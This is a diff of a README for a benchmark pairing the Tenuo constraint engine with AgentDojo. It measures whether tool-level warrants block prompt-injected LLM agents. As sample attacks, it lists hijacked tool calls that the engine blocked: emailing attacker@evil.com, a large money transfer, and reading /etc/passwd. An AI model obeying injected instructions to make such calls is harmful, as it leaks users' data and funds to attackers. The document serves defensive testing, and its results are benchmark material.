@@ -1,170 +1,80 @@
-# AgentDojo Benchmark Integration
+# AgentDojo Integration
 
-Empirical validation of Tenuo's constraint enforcement using [AgentDojo](https://github.com/ethz-spylab/agentdojo).
+> **Work in Progress**: This benchmark is under active development.
 
-⚠️ **Work in Progress**: This benchmark is under active development. Results may vary based on model, attack type, and constraint configuration.
+Integration of Tenuo with [AgentDojo](https://github.com/ethz-spylab/agentdojo) to demonstrate constraint enforcement in LLM agent pipelines.
 
-## What This Tests
+## What This Shows
 
-Tenuo is a deterministic constraint engine. If you constrain recipients to
-`*@company.com`, emails to `attacker@evil.com` are blocked.
-
-This benchmark validates:
-- Constraints are enforced under adversarial conditions
-- Compromised LLMs cannot exceed their granted capabilities
-- Overhead is acceptable for real workloads
-
-## Results
-
-| Model | Malicious Calls | Blocked | Pass Rate |
-|-------|-----------------|---------|-----------|
-| gpt-5.1 | 36 | 36 | 100% |
-| gpt-4o-mini | 31 | 31 | 100% |
-
-When the compromised LLM tried to exceed its warrant (e.g., email `evil.com` when only `*@company.com` was allowed), the call was blocked.
-
-### How It Works
+Tenuo enforces capability constraints at the tool boundary. When an agent attempts a tool call that violates its warrant, the call is blocked—regardless of how the agent was prompted.
 
 ```
-┌─────────────────┐     ┌─────────────┐     ┌─────────────┐     ┌──────────┐
-│ Malicious Input │ ──▶ │  LLM Agent  │ ──▶ │   Tenuo     │ ─X─ │  Tool    │
-│ "email evil.com"│     │  (tricked)  │     │  (checks)   │     │ (blocked)│
-└─────────────────┘     └─────────────┘     └─────────────┘     └──────────┘
-                                                  │
-                                                  ▼
-                                           [BLOCKED] "evil.com" does not
-                                              match "*@company.com"
+Agent: "I'll send this to attacker@evil.com"
+Warrant: recipients must match @company.com
+Result: BLOCKED
 ```
-
-| What LLM Tried | Constraint | Result |
-|----------------|------------|--------|
-| `send_email(to="attacker@evil.com")` | `to: *@company.com` | Blocked |
-| `transfer_money(amount=50000)` | `amount: 0..1000` | Blocked |
-| `read_file(path="/etc/passwd")` | `path: docs/*` | Blocked |
-
-### Utility Metrics
-
-| Model | Legitimate Calls | False Positives |
-|-------|------------------|-----------------|
-| gpt-5.1 | 337 | 0 |
-| gpt-4o-mini | 373 | 0 |
-
-### Same Agent, Different Warrant
-
-Tenuo solves the temporal mismatch problem: **same agent + different warrant = different capabilities**.
-
-```python
-agent = create_agent()
-
-# Task 1: Scoped warrant
-warrant = issue(tools=["send_email"], recipients="*@company.com")
-agent.run(warrant=warrant)  # team@company.com -> allowed
-
-# Attack injection with same warrant
-agent.run(warrant=warrant)  # attacker@evil.com -> blocked
-
-# Admin task with broader warrant
-admin_warrant = issue(tools=["send_email"], recipients="*")
-agent.run(warrant=admin_warrant)  # external@partner.com -> allowed
-```
-
-<details>
-<summary>Detailed Breakdown by Model</summary>
-
-#### gpt-5.1 on Workspace Suite
-
-**240 security test cases** → **36 malicious tool calls** → **0 succeeded**
-
-| What Was Blocked | Count |
-|------------------|-------|
-| Email to external address | 29 |
-| Calendar invite to external user | 6 |
-| Sensitive file operation | 1 |
-
-#### gpt-4o-mini on Workspace Suite
-
-**240 security test cases** → **31 malicious tool calls** → **0 succeeded**
-
-| What Was Blocked | Count |
-|------------------|-------|
-| Email to external address | 18 |
-| Calendar invite to external user | 6 |
-| File shared externally | 6 |
-| Unauthorized file deletion | 1 |
-
-</details>
-
----
 
 ## Quick Start
 
 ```bash
-# Install dependencies (AgentDojo pinned to 0.1.35)
+# Install
 pip install -r benchmarks/agentdojo/requirements.txt
+export OPENAI_API_KEY="sk-..."
 
-# Dry run (no API calls)
-python -m benchmarks.agentdojo.evaluate --suite workspace --dry-run
+# Run
+python -m benchmarks.agentdojo.evaluate --suite workspace --model gpt-4o-mini \
+  --user-tasks 5 --injection-tasks 3
 
-# Real benchmark
-python -m benchmarks.agentdojo.evaluate --suite workspace --model gpt-4o-mini
-
-# Smaller run for iteration speed
-python -m benchmarks.agentdojo.evaluate --suite workspace --model gpt-4o-mini --user-tasks 3 --injection-tasks 2
-
-# Analyze results
+# Analyze
 python -m benchmarks.agentdojo.analyze results/workspace/<timestamp>/
 ```
 
-Note: AgentDojo 0.1.35 may emit a warning about `pipeline_name` not being known.
-This is a logging-only warning and does not affect benchmark correctness.
+## Example Output
 
-## Configuration
+```
+Tool calls allowed: N
+Tool calls blocked: M
 
-### Models
+Blocked by constraint:
+  send_email.recipients: X
+  delete_file.file_id: Y
 
-```bash
---model gpt-4o-mini    # Fast, cost-effective
---model gpt-4o         # Better reasoning
---model gpt-5.1        # Latest
+Enforcement accuracy: 100%
 ```
 
-### Suites
+Run the benchmark to see your results.
 
-| Suite | Tools | Tasks | Focus |
-|-------|-------|-------|-------|
-| `workspace` | 33 | 40 | Email, files, calendar |
-| `banking` | 11 | 16 | Money transfers |
-| `slack` | 11 | 21 | Messaging |
-| `travel` | 26 | 20 | Bookings |
+## Baseline Policy
 
-## Constraint Definitions
+| Tool | Constraint |
+|------|------------|
+| `send_email` | Recipients: `@company.com`, `@bluesparrowtech.com` |
+| `delete_file` | Protected IDs: 13, 14, 15 |
+| `share_file` | Internal emails only |
+| Read operations | Allowed |
 
-See `warrant_templates.py`:
+## CLI Options
 
-```python
-WORKSPACE_CONSTRAINTS = {
-    "send_email": {"recipients": Pattern("*@company.com")},
-    "read_file": {"path": AnyOf([Pattern("docs/*"), Pattern("data/*")])},
-    "transfer_money": {"amount": Range(0, 1000)},
-}
+```
+--suite        workspace, banking, travel, slack
+--model        gpt-4o-mini (default), gpt-4o
+--user-tasks   Limit user tasks (faster runs)
+--injection-tasks  Limit injection tasks
+--dry-run      Validate setup without API calls
 ```
 
 ## Files
 
 ```
 benchmarks/agentdojo/
-├── evaluate.py          # CLI entrypoint
+├── evaluate.py          # CLI
 ├── harness.py           # AgentDojo integration
-├── warrant_templates.py # Constraint definitions
-├── task_policies.py     # JIT task-aware constraint selection
-├── tool_wrapper.py      # Authorization layer
-├── analyze.py           # Results analysis
-└── requirements.txt     # Dependencies
+├── task_policies.py     # Baseline policy
+├── tool_wrapper.py      # Enforcement layer
+└── analyze.py           # Results analysis
 ```
 
-## Further Reading
+## See Also
 
-- [Tenuo Concepts](https://tenuo.dev/concepts) - Capability token fundamentals
-- [Constraints Reference](https://tenuo.dev/constraints) - Pattern, Range, OneOf
-- [AgentDojo Paper](https://arxiv.org/abs/2401.13138) - Benchmark methodology
-- [Delegation Benchmark](../delegation/) - Multi-warrant scenarios
+- [benchmarks/cryptographic/](../cryptographic/) — Tenuo's cryptographic guarantees
+- [benchmarks/delegation/](../delegation/) — Multi-agent delegation scenarios
